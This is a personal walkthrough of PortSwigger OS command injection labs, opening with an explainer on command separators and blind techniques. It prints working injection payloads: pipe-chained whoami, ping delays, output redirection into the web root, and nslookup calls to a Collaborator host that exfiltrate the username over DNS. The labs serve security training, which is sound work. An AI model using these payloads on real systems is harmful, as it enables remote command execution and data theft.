## **PortSwigger - OS Command Injection**


OS command injection, also known as shell injection, is a web security vulnerability that allows an attacker to execute arbitrary operating system commands on the server that is running an application, and typically fully compromise the application and all of its data. An attacker could potentially leverage an OS command injection vulnerability to compromise other parts of the hosting infrastructure to pivot the attack to other systems within the organization.  

If a web application implements no defenses against OS command injection an attacker can simply use the `&` command separator to submit commands inside of a given parameter.  It is also useful to place an additional command separator at the end of the injected command. This reduces the likelihood that what follows will prevent the injected command from executing. 

The following commands are generally considered useful to execute to obtain additional information about a system. 

**Linux:** 

``` 
whoami 
uname -a  
ifconfig 
netstat -an 
ps -ef 
``` 

**Windows:** 

``` 
whoami 
ver 
ipconfig /all 
netstat -an 
tasklist 
```

A variety of shell metacharacters can be used to perform OS command injection attacks since some characters function as command separators, allowing commands to be chained together.  

Unix and Windows based systems all use: 

``` 
& 
&& 
| 
|| 
```  

Linux: 

``` 
; 
0x0a or \n - new line character 
``` 

On Unix based systems you can also use backticks ``` or the dollar character `$` to perform inline execution of an injected command within the original command. 

Sometimes the input that the user controls appears within quotation marks in the original command. In this situation you need to terminate the quoted context before using suitable shell metacharacters to inject a new command. 

Many instances of OS command injection are blind vulnerabilities. This means that the application does not return the output from the command within its HTTP response. Blind vulnerabilities can still be exploited, but different techniques are required. 

Consider a web application that lets users submit feedback about the site. The user enters their email address and feedback message. The server-side application then generates an email to a site administrator containing the feedback. To do this it calls out the `mail` program with the submitted details. The output from the `mail` command is not returned in the applications responses, so using the `echo` payload would not be effective. A variety of other techniques can be relied on in Blind OS Command Injection situations. 

An injected command that will trigger a time delay can be used to confirm that the command was executed based on the time that the application takes to respond. The `ping` command is an effective way to do this as it lets the attacker specify the number of ICMP packets to send, and therefore the time take for the program to run. For example, `& ping â€“c 10 127.0.0.1& will cause the application to ping its loopback IP address for 10 seconds. 

An attacker can also redirect the output from the injected command into a file within the web root that they can then retrieve using the browser. For example if the application servers static resources from the file location `/var/ww/static` the attacker can redirect their `whoami` command results to a file in that directory then navigate to it in the url. 

An attacker can use an injected command that will trigger an out-of-band (OAST) network interaction with a system that they control which they can then monitor and detect that the command was successfully injected. The out of band channel can also provide an easy way to exfiltrate the output from

**Labs** 

*OS Command Injection, Simple Case* 

![lab1](/docs/assets/images/portswigger/oscommandinjection/osci01.png)

Since the vulnerability is in the product stock checker I need to pick a product from the home page, navigate to its product page, and capture a request to check the stock of the item at a given location. 

![check stock](/docs/assets/images/portswigger/oscommandinjection/osci02.png)

![request](/docs/assets/images/portswigger/oscommandinjection/osci03.png)

With the request for `/product/stock` sent to the repeater I just need to modify the *storeId* parameter so that it's followed by a pipe separator `|` and the `whoami` command. 

`productId=1 & storeId=1 | whoami` 

![edit request](/docs/assets/images/portswigger/oscommandinjection/osci04.png)

Forwarding the request displays the username the web application uses query the system in the rendered response, `peter-u5R48v`. 

This also solves the challenge for this lab.

*Blind OS Command Injection With Time Delays* 

![lab2](/docs/assets/images/portswigger/oscommandinjection/osci06.png)

For this challenge I need to navigate over to the product page and capture a request to submit feedback and send it to the repeater. 

![submit feedback](/docs/assets/images/portswigger/oscommandinjection/osci07.png)

![the literal feedback](/docs/assets/images/portswigger/oscommandinjection/osci08.png)

![feedback request](/docs/assets/images/portswigger/oscommandinjection/osci09.png)

For this lab the vulnerable parameter is *email*. It can be escaped using `||` and then the `ping` command can be injected onto the system and cause a time delay by first generating traffic to the loop back address `127.0.0.1` before executing the rest of the feedback submission.  

`email=crumbles%40Crumbles.com|| ping -c 10 127.0.0.1 ||` 

This can be observed by the response time in the lower right hand corner of burp, `9,362 milli seconds`. 

![request with time dealy](/docs/assets/images/portswigger/oscommandinjection/osci10.png)

Which was close enough to 10 seconds to satisfy the challenge for this lab.

*Blind OS Command Injection With Output Redirection* 

![lab3](/docs/assets/images/portswigger/oscommandinjection/osci12.png)

Since the vulnerability is again in the *Submit feedback* functionality I will need to capture a request for `/feedback/submit` and send it to the repeater. 

![submit feedback](/docs/assets/images/portswigger/oscommandinjection/osci13.png)

![post request to repeater](/docs/assets/images/portswigger/oscommandinjection/osci14.png)

The *email* parameter is again the functionality that is vulnerable to the OS command injection. I'l edit the value with the double pipe command separator `||` and inject the `whoami` command to be to output to the provided directory `/var/www/images`. 

`email=crumbles%40Crumbles.com||whoami>/var/www/images/whoami.txt||`

![edit email](/docs/assets/images/portswigger/oscommandinjection/osci15.png)

Now to retrieve the output of the command I'll have to capture a request for one of the product images since that is what has the functionality to access the /var/www/images directory. 

![open image in new tab](/docs/assets/images/portswigger/oscommandinjection/osci16.png)

![image request](/docs/assets/images/portswigger/oscommandinjection/osci17.png)

I'll need to send the request to `/image?filename=31.jpg` to the repeater so that I can edit the file name value to retrieve the contents of my created file `whoami.txt`. 

`/image?filename=whoami.txt` 

![edit request to image](/docs/assets/images/portswigger/oscommandinjection/osci18.png)

Forwarding the request I can see the output of the `whoami` command `peter-qDfZTJ`. This completes the challenge for this lab. 

![lab3 solved](/docs/assets/images/portswigger/oscommandinjection/osci19.png)

*Blind OS Command Injection With Out-Of-Band Interaction* 

![lab4](/docs/assets/images/portswigger/oscommandinjection/osci20.png)

Once again for this lab the vulnerability is within the feedback functionality so I'll have to capture a request to submit feedback and send it to the repeater. 

![submit feedback](/docs/assets/images/portswigger/oscommandinjection/osci21.png)

![the literal feedback](/docs/assets/images/portswigger/oscommandinjection/osci22.png)

![feedback request to repeater](/docs/assets/images/portswigger/oscommandinjection/osci23.png)

Since I'll be utilizing and *Out Of Band Interaction* I'll have to make sure that I start the *Collaborator* within Burp. I also have to make sure the Collaborator's server location is included in the payload. 

![collaborator on](/docs/assets/images/portswigger/oscommandinjection/osci24.png)

With that I can go back to the repeater. The vulnerable parameter is once again *email*. This time I'll use the double pipe symbol `||` to inject the `nslookup` command using the `+` I can add the collaborator's payload by right clicking the area after `+` and selecting *insert Collaborator Payload*. I then need to close the payload with another double pipe symbol `||` so that the command can continue as normal in case there are any server side checks to ensure it completes. 

`email=crumbles%40Crumbles.com||nslookup+8bkvi8b3hr59f6o3c1ya453fm6sxgr4g.oastify.com||` 

![editted request](/docs/assets/images/portswigger/oscommandinjection/osci25.png)

I can see from the response that the request was successful. I can verify the payload caused the server to perform a *DNS* query on my collaborator server back in the collaborator tab in burp.  

![DNS query](/docs/assets/images/portswigger/oscommandinjection/osci26.png)

This also completes the challenge for this lab.

*Blind OS command Injection With Out-Of-Band Data Exfiltration* 

![lab5](/docs/assets/images/portswigger/oscommandinjection/osci28.png)

 I'll need to again capture a request to submit feedback and forward it to the repeater. 

![submit feedback](/docs/assets/images/portswigger/oscommandinjection/osci29.png)

![literal feedback](/docs/assets/images/portswigger/oscommandinjection/osci30.png)

![feedback request](/docs/assets/images/portswigger/oscommandinjection/osci31.png)

Next I need to start the *collaborator* so that I can craft my payload. 

![collaborator start](/docs/assets/images/portswigger/oscommandinjection/osci32.png)

It's again the `email` parameter that is vulnerable to the command injection. I'll escape the intended shell command with the double pipe symbol `||` and insert the `nslookup` command I will also use the `+` operator to insert the `whoami` command, which must also be wrapped in backticks, the *whoami* command needs to be followed by a period `.`, then I right click the space following the period and select *insert collaborate payload*, finally I finish the payload with another double pipe symbol `||` so that the shell command will continue to execute as normal.  

`email=crumbles%40Crumbles.com||nslookup+`whoami`.pkdyntaakaaqqp70m804zs0bo2utij68.oastify.com||` 

![editted request](/docs/assets/images/portswigger/oscommandinjection/osci33.png)

I can see from the request response that the server responded with a *200*. Back in the *collaborator* I can select the payload  and locate the results of the *whoami* command from the in the description, `peter-Je5bag`.  

![dns query](/docs/assets/images/portswigger/oscommandinjection/osci34.png)

With the username in hand I just select *Submit Solution* at the top of the lab and paste it into the window that pops up.  

![submit](/docs/assets/images/portswigger/oscommandinjection/osci35.png)

Once submitted the lab gets marked as solved.
